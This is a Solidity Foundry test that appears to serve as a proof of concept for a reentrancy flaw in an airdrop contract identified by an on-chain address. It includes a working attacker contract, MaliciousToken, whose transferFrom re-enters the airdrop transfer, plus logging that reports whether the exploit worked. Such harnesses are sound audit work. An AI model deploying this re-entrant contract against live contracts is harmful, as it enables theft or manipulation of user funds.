// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import "../src/0x4051334adc52057aca763453820cb0e045076ef3.sol";

contract ReentrancyTest is Test {
    airdrop public airdropContract;
    MaliciousToken public malToken;
    
    address user1 = makeAddr("user1");
    address attacker = makeAddr("attacker");
    uint256 constant TRANSFER_AMOUNT = 100;

    function setUp() public {
        airdropContract = new airdrop();
        malToken = new MaliciousToken(address(airdropContract), attacker);
    }

    function testReentrancy() public {
        // Enable reentrancy attack condition
        malToken.setReentrancyTrigger(true);
        
        // Prepare recipient array
        address[] memory recipients = new address[](1);
        recipients[0] = address(malToken);
        
        console2.log("--- BEFORE-Trigger Transfer ---");
        uint256 totalAirdropsBefore = airdropContract.totalAirdrops();
        uint256 testContractAirdropsBefore = airdropContract.userAirdropCount(address(this));
        uint256 malTokenAirdropsBefore = airdropContract.userAirdropCount(address(malToken));
        uint256 totalTokensBefore = airdropContract.totalTokensDistributed();
        
        console2.log("totalAirdrops:          ", totalAirdropsBefore);
        console2.log("testContractAirdrops:   ", testContractAirdropsBefore);
        console2.log("malTokenAirdrops:       ", malTokenAirdropsBefore);
        console2.log("totalTokensDistributed: ", totalTokensBefore);
        
        console2.log("--- Trigger: Vulnerable Transfer ---");
        // Execute vulnerable transfer function in the airdrop contract
        airdropContract.transfer(
            address(malToken),
            address(malToken),
            recipients,
            TRANSFER_AMOUNT
        );
        
        console2.log("--- AFTER-Trigger Transfer ---");
        uint256 totalAirdropsAfter = airdropContract.totalAirdrops();
        uint256 testContractAirdropsAfter = airdropContract.userAirdropCount(address(this));
        uint256 malTokenAirdropsAfter = airdropContract.userAirdropCount(address(malToken));
        uint256 totalTokensAfter = airdropContract.totalTokensDistributed();
        
        console2.log("totalAirdrops:          ", totalAirdropsAfter);
        console2.log("testContractAirdrops:   ", testContractAirdropsAfter);
        console2.log("malTokenAirdrops:       ", malTokenAirdropsAfter);
        console2.log("totalTokensDistributed: ", totalTokensAfter);
        
        // Calculate state changes
        uint256 deltaAirdrops = totalAirdropsAfter - totalAirdropsBefore;
        uint256 deltaTestAirdrops = testContractAirdropsAfter - testContractAirdropsBefore;
        uint256 deltaMalTokenAirdrops = malTokenAirdropsAfter - malTokenAirdropsBefore;
        uint256 deltaTokens = totalTokensAfter - totalTokensBefore;
        
        console2.log("Delta totalAirdrops:           ", deltaAirdrops);
        console2.log("Delta testContractAirdrops:    ", deltaTestAirdrops);
        console2.log("Delta malTokenAirdrops:        ", deltaMalTokenAirdrops);
        console2.log("Delta totalTokensDistributed:  ", deltaTokens);
        
        // Vulnerability verdict - reentrancy successful if:
        // 1. Total airdrops increased by 2 instead of 1
        // 2. MalToken airdrops count increased unexpectedly
        if (deltaAirdrops == 2) {
            console2.log("Vulnerability Exists: Reentrancy attack created extra airdrop");
        } else {
            console2.log("Vulnerability not Exist: No extra airdrops detected");
        }
        
        // Verify the test contract has 1 airdrop from initial call
        uint256 testContractAirdrops = airdropContract.userAirdropCount(address(this));
        assertEq(testContractAirdrops, 1, "Test contract should have 1 airdrop");
        
        // Verify the malicious token has 1 airdrop from reentrant call
        uint256 malTokenAirdrops = airdropContract.userAirdropCount(address(malToken));
        assertEq(malTokenAirdrops, 1, "Malicious token should have 1 airdrop");
    }
}

contract MaliciousToken {
    airdrop public airdropContract;
    address public attacker;
    bool private reentrancyTrigger;
    
    constructor(address _airdropContract, address _attacker) {
        airdropContract = airdrop(_airdropContract);
        attacker = _attacker;
    }
    
    function setReentrancyTrigger(bool _enabled) external {
        reentrancyTrigger = _enabled;
    }
    
    function transferFrom(address, address, uint256) public returns (bool) {
        if (reentrancyTrigger) {
            reentrancyTrigger = false;
            
            // Execute reentrant call
            address[] memory recipients = new address[](1);
            recipients[0] = attacker;
            
            airdropContract.transfer(
                address(this),
                address(this),
                recipients,
                0
            );
        }
        return true;
    }
}